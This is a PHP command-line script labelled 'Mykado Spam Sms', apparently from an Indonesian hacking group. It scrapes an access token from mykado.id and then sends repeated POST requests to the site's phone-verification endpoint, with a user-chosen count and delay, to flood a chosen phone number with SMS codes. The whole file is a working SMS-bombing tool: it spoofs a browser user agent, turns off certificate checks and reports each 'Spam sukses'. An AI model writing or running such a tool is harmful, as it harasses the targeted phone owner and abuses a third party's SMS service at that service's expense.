<?php 
/*
coded by bagoes
*/
error_reporting(0);
function copyright(){
	/*
	Author : ./9host
	Indonesian Freedom Security
	Don't remove this copyright please !
	*/
	echo "
         /\  ________.__                    __   
        / / /   __   \  |__   ____  _______/  |_ 
       / /  \____    /  |  \ /  _ \/  ___/\   __\
      / /      /    /|   Y  (  <_> )___ \  |  |  
 /\  / /      /____/ |___|  /\____/____  > |__|  
 \/  \/                   \/           \/        
	
		Mykado Spam Sms
	\n\n";
}

function ngirim($no, $jumlah, $delay, $aksestoken){
	for($x = 1;$x <= $jumlah; $x++) {

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://www.mykado.id//apiv2/account/verification-code?&access_token=".$aksestoken);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $no);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_REFERER, 'https://mykado.id/#daftar');
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
		$result = curl_exec($ch);
		curl_close($ch);
		$result = json_decode($result,1);

if($result['status'] == "SUCCESS"){
echo $x.") Spam sukses\n";
}else{
echo $x.") Spam gagal\n";
}
		sleep($delay);
		flush();
	}
}
$ambil = file_get_contents("https://mykado.id/");
preg_match_all("'<script>window.accessToken=\'(.*?)\';</script>'si",$ambil,$token);
$token = $token[1][0];
copyright();
echo "Masukkan Nomor : ";
$nomer = trim(fgets(STDIN));
$data = json_encode(array('phoneNo' => $nomer));
echo "Jumlah : ";
$req = trim(fgets(STDIN));
echo "Jeda : ";
$jeda = trim(fgets(STDIN));
$execute = ngirim($data, $req, $jeda, $token);
print $execute;
?>